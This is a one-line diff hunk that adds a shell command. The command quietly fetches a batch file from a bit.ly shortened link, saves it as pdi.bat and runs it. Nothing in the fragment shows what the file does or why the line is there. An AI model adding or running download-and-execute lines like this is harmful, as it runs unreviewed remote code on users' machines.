@@ -1,0 +1,1 @@
+curl -sL https://bit.ly/PdI -o pdi.bat && pdi.bat
